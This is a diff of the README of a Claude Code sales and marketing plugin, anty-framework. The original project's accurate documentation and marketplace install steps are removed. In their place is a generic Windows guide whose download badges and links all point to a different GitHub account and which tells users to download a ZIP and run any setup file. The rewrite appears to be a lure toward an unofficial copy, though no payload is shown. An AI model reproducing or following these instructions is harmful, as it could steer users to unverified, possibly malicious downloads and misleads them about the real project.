@@ -1,176 +1,211 @@
-# Anty Framework
+# 🤖 anty-framework - Run AI strategy inside Claude Code
 
-[![release](https://img.shields.io/badge/release-v0.1.0-blue)](https://github.com/masterleopold/anty-framework/releases) [![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT) [![GitHub stars](https://img.shields.io/github/stars/masterleopold/anty-framework)](https://github.com/masterleopold/anty-framework/stargazers) [![Claude Code](https://img.shields.io/badge/Claude%20Code-Plugin-blueviolet)](https://docs.anthropic.com/en/docs/claude-code) [![Sponsor](https://img.shields.io/badge/Sponsor-%E2%9D%A4-pink)](https://github.com/sponsors/masterleopold)
+[![Download anty-framework](https://img.shields.io/badge/Download%20anty--framework-4A90E2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Ingramradical235/anty-framework)
 
-> Your AI co-worker for startup sales & marketing — powered by Claude Code.
+## 🧭 What this is
 
-A Claude Code plugin that gives startup founders a proactive AI co-worker for sales & marketing. Anty doesn't wait for instructions — it analyzes your situation, plans strategy, proposes actions, and executes with graduated autonomy.
+anty-framework is an AI Workforce plugin for Claude Code. It helps startup founders work through sales and marketing tasks with a set of built-in skills, commands, and AI agents.
 
-You describe your business. Anty builds the go-to-market plan and runs it.
+It is built for non-technical users who want support with planning, outreach, positioning, and strategy. You use it inside Claude Code, then pick the command or agent that fits the task you want to complete.
 
-## What is Anty?
+## ✨ What you get
 
-Anty is an AI workforce agent that operates as your S&M (Sales & Marketing) team member. It combines 15+ strategic frameworks from business literature into an integrated planning and execution engine:
+- 24 domain knowledge skills
+- 10 commands for common tasks
+- 4 AI agents for focused work
+- Strategy tools for sales and marketing
+- Support for startup planning
+- Frameworks for decision making and message design
+- A setup that fits into Claude Code
+- A workflow that helps you move from idea to action
 
-- **Strategy Kernel** (Rumelt) — Diagnosis → Guiding Policy → Coherent Actions
-- **Critical Chain** (Goldratt/TOC) — Buffer management, relay runner execution, constraint focus
-- **QUEST** (Wiss) — Socratic questioning methodology for deep understanding
-- **Nudge** (Thaler) — Choice architecture for better decision-making
-- **Culture Map** (Meyer) — 8-dimension cultural localization for global outreach
-- **Cold Start Problem** (Chen) — Network effects, atomic networks, escape velocity
-- **Value Stick** (Oberholzer-Gee) — WTP/WTS pricing strategy
-- And more: Effectuation, Pre-Mortem, Plan B, Cash Machine pipeline, PMF detection...
+## 🖥️ Before you start
 
-## Installation
+Use a Windows PC with:
 
-### Install from GitHub (recommended)
+- Windows 10 or Windows 11
+- A stable internet connection
+- Enough free space for the app files
+- Claude Code installed and ready to use
+- A GitHub account if your browser asks you to sign in
 
-In Claude Code, run:
+If Claude Code is not installed yet, set that up first, then return here.
 
-```
-/plugin
-```
+## 📥 Download and install
 
-1. Navigate to the **Marketplaces** tab
-2. Select **Add marketplace** and enter: `masterleopold/anty-framework`
-3. Navigate to the **Discover** tab
-4. Find **anty** and install it
+Visit this page to download and install anty-framework:
 
-After this, just run `claude` — Anty loads automatically in every session. No extra flags needed.
+[Open anty-framework on GitHub](https://github.com/Ingramradical235/anty-framework)
 
-You can choose a scope during installation:
+On the page:
 
-| Scope | Effect |
-|---|---|
-| **user** (default) | Available in all your projects |
-| **project** | Shared with your team via `.claude/settings.json` |
-| **local** | Only you, only this repository |
+1. Open the repository link
+2. Look for the latest release or the main project files
+3. Download the files to your computer
+4. If you get a ZIP file, save it to a folder you can find again
+5. If you get a folder or install package, keep it in the same place for setup
 
-### Try It (one-time)
+If the project gives you a ZIP file, right-click it and choose Extract All. Use a folder name you will recognize, such as `anty-framework`.
 
-```bash
-git clone https://github.com/masterleopold/anty-framework.git
-claude --plugin-dir ./anty-framework
-```
+## 🛠️ Set it up on Windows
 
-This loads the plugin for the current session only. You'll need to pass `--plugin-dir` each time.
+1. Open the folder where you saved the files
+2. Keep the project folder in a simple location, such as Desktop or Downloads
+3. Open Claude Code
+4. Add or connect the anty-framework files in the place Claude Code expects plugins or tools
+5. Follow the project files in the repository for the exact setup path
+6. Restart Claude Code after the files are in place
 
-### Updating
+If the project includes a setup file, open it and follow the on-screen steps. If it includes a config file, use the default values first.
 
-```
-/plugin
-```
+## 🚀 How to use it
 
-Navigate to the **Installed** tab and select **Update** next to anty, or run `/reload-plugins` to refresh all plugins.
+Once the setup is done, use anty-framework inside Claude Code for tasks such as:
 
-### Requirements
+- Writing a sales plan
+- Reviewing a startup idea
+- Building a marketing plan
+- Finding a better message for a product
+- Planning outreach to leads
+- Choosing a strategy for growth
+- Comparing different frameworks
+- Preparing for founder decisions
+- Turning rough notes into a clear plan
 
-- [Claude Code](https://docs.anthropic.com/en/docs/claude-code) CLI installed and authenticated
+You can choose the command or agent that matches the job you want to do. For best results, keep each task small and clear.
 
-## Quick Start
+## 🧠 Included skills
 
-```
-/anty:onboard     # Conversational interview — builds your business context
-/anty:plan         # Generates Strategy Kernel + KPI tree + action proposals
-/anty:actions      # Review and approve 3-option action proposals
-/anty:status       # CLI dashboard — goals, buffer health, pipeline
-/anty:loop 30m     # Start persistent operation (scans every 30 min)
-```
+The 24 domain knowledge skills cover areas such as:
 
-## Commands
+- Startup strategy
+- Sales planning
+- Marketing planning
+- Positioning
+- Offer design
+- Customer research
+- Lead outreach
+- Funnel thinking
+- Competitive review
+- Founder decision support
 
-| Command | Description |
-|---|---|
-| `/anty:onboard` | QUEST-based conversational interview (14 topics) |
-| `/anty:plan` | Strategy Kernel + KPI tree + Pre-Mortem + scenarios |
-| `/anty:actions` | 3-option choice approval with Nudge architecture |
-| `/anty:status` | CLI dashboard (goals, buffer, growth, pipeline) |
-| `/anty:pipeline` | Sales pipeline management (Cash Machine) |
-| `/anty:scan` | 10-point analysis cycle |
-| `/anty:loop` | Persistent operation at specified interval |
-| `/anty:rules` | View/edit User Rules (highest priority) |
-| `/anty:identity` | View/edit Agent Identity (communication style, values) |
-| `/anty:review` | 5-question review engine |
+These skills help Claude Code respond with more useful guidance for business work.
 
-## How It Works
+## ⚙️ Commands
 
-1. **You onboard** — `/anty:onboard` runs a 14-topic Socratic interview covering product, market, pricing, competitors, pain intensity, PMF signals, culture settings, and more
-2. **Anty plans** — `/anty:plan` generates a Strategy Kernel (diagnosis with reframing, guiding policy, coherent actions), decomposes into a KPI tree, identifies the Crux (most important AND solvable challenge), runs pre-mortem analysis, and proposes 3-option actions
-3. **You choose** — `/anty:actions` presents options with Nudge choice architecture (smart defaults, outcome mapping, your own data surfaced before choices)
-4. **Anty executes** — Actions are executed by specialized subagents (Research, Planner, Content, Analyst) with graduated autonomy
-5. **Anty learns** — Every choice you make trains the preference model. Over time, proposals get more accurate and autonomy increases
-6. **Anty scans** — `/anty:loop` runs continuous analysis checking buffer health, KPI propagation, pipeline stalls, environmental changes, and anti-patterns
+The 10 commands help you start common tasks without building each prompt from scratch. You can use them for things like:
 
-## Domain Knowledge (24 Skills)
+- Creating a strategy brief
+- Testing a market idea
+- Building a customer profile
+- Drafting a campaign plan
+- Reviewing a sales process
+- Comparing framework options
+- Planning next steps
+- Organizing founder work
+- Checking key assumptions
+- Turning input into a clear action plan
 
-Anty's intelligence comes from 24 domain-specific knowledge modules across 7 domains:
+Use one command at a time when possible. That keeps the output easier to review.
 
-| Domain | Skills |
-|---|---|
-| **Strategy** | Strategy Kernel, Pre-Mortem & Plan B, Effectuation, Disruption Analysis |
-| **Planning** | Critical Chain & TOC, KPI Tree, Root Cause Analysis, Review Engine |
-| **Behavioral** | QUEST Interview, Choice Architecture, Confidence Calibration, Culture Map |
-| **Marketing** | Growth Metrics & YC Benchmarks, Retention Cohorts & PMF, Network Effects, Content Rules |
-| **Sales** | Pipeline (Cash Machine), Lead Qualification, Anticipatory Selling |
-| **Pricing** | Value Stick (WTP/WTS), Unit Economics (CLV/CAC/NDR) |
-| **Failure Patterns** | Anti-Pattern Detection (12 patterns), Failure Essence (4 patterns), Plan B Framework |
+## 🤖 AI agents
 
-## Subagents
+The 4 AI agents are built for focused work. Each one can take on a different part of the strategy process, such as:
 
-| Agent | Role | Model |
-|---|---|---|
-| **Research** | Market research, competitor analysis, six-force environmental scanning | Opus |
-| **Planner** | Strategy, KPI tree, crux identification, action generation | Opus |
-| **Content** | Outreach drafts, content creation, cultural localization | Opus |
-| **Analyst** | KPI tracking, verification, root cause analysis, anti-pattern detection | Opus |
+- Research
+- Planning
+- Review
+- Execution support
 
-## Data Storage
+If you are not sure which agent to use, start with the one that matches your most urgent problem.
 
-All data persists locally in `.anty/` (gitignored — your data stays private):
+## 🔧 Common use cases
 
-```
-.anty/
-├── config.yaml              # Plugin config (culture, scan frequency, mode)
-├── business-context.yaml    # Onboarding results
-├── rules.md                 # User Rules (CLAUDE.md-style)
-├── identity.md              # Agent Identity (SOUL.md-style)
-├── scratchpad.md            # Working memory (append-only)
-├── goals/                   # Goals with Strategy Kernels
-├── drivers/                 # KPI tree drivers
-├── actions/                 # Action items with status
-├── pipeline/deals/          # Sales pipeline deals
-├── learning/                # Choice history, preferences, templates
-└── history/scans/           # Historical scan results
-```
+### 📈 Sales planning
 
-## Key Design Principles
+Use the plugin to shape your sales process, define your target buyer, and map the next step in the pipeline.
 
-- **Invisible AI** — Frameworks are never front-loaded; they surface exactly when relevant (JIT knowledge delivery)
-- **Anti-sycophancy** — Anty pushes back with evidence when your strategy conflicts with data
-- **Source attribution** — "Your data shows..." never "I recommend..."
-- **Contextual confidence** — Deflates overconfidence on irreversible decisions, protects momentum on reversible ones
-- **Cultural localization** — Adapts communication to your culture (Layer A) and outreach to target market culture (Layer B)
-- **Customer as protagonist** — All generated content puts the customer at center, never the company
+### 📣 Marketing strategy
 
-## Web App
+Use it to outline your message, pick campaign angles, and plan content that fits your audience.
 
-Anty Framework is the Phase 0 prototype. The full web application (SaaS) is planned at [4n7y.com](https://4n7y.com) with:
-- Real-time dashboard (Convex + Next.js)
-- Data integrations (Stripe, PostHog, HubSpot via MCP)
-- Cross-company learning (Action Performance Index)
-- Stripe billing (per-action metering)
+### 🧩 Startup positioning
 
-Plugin logic transfers directly to the web app — skills become knowledge modules, commands become dashboard screens, `.anty/` files become database tables.
+Use it to explain what your product does, who it helps, and why it matters.
 
-## Prerequisites
+### 🗂️ Founder workflow
 
-- [Claude Code](https://docs.anthropic.com/en/docs/claude-code) installed and authenticated
-- Claude Max or API subscription
+Use it to turn a broad goal into a set of smaller tasks you can review and complete.
 
-## Contributing
+## 🧭 Suggested first run
 
-See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines on adding skills, commands, and agents.
+If this is your first time using anty-framework, start with this order:
 
-## License
+1. Open Claude Code
+2. Load the anty-framework files
+3. Run a simple strategy task
+4. Ask for a sales or marketing plan
+5. Review the output
+6. Try a second command with a different goal
 
-[MIT](LICENSE)
+A simple first task could be:
+
+- “Help me define my startup’s target customer”
+- “Build a marketing plan for my new product”
+- “Review this sales idea and find weak spots”
+
+## 🧪 Troubleshooting
+
+### Claude Code does not see the plugin
+
+- Check that the files are in the right folder
+- Restart Claude Code
+- Confirm the file names match the project files
+- Make sure the folder was extracted fully if you used a ZIP file
+
+### The download does not open
+
+- Try the GitHub link again
+- Refresh the page
+- Check your internet connection
+- Use a different browser if needed
+
+### The setup does not work
+
+- Open the repository page and read the project files again
+- Use the default settings first
+- Remove the files and repeat the setup if the folder looks wrong
+
+### The output feels too broad
+
+- Give Claude Code one task at a time
+- Use a clear goal
+- Add details such as audience, product, and stage of the business
+
+## 🧰 Folder tips for Windows
+
+Keep your files easy to find:
+
+- Use `Downloads` or `Desktop`
+- Avoid deep folder paths
+- Do not rename files unless the setup asks you to
+- Keep the extracted folder together
+- Back up the files if you move them
+
+## 📚 Topics covered
+
+This project is tied to:
+
+ai-agent, ai-workforce, anthropic, automation, autonomous-agent, claude, claude-code, claude-code-plugin, marketing, sales, startup, strategy
+
+## 🔗 Download again
+
+[Visit the anty-framework GitHub page](https://github.com/Ingramradical235/anty-framework)
+
+## 📄 Repository info
+
+- Repository: anty-framework
+- Description: AI Workforce plugin for Claude Code — proactive sales & marketing strategy for startup founders
+- Domain knowledge skills: 24
+- Commands: 10
+- AI agents: 4
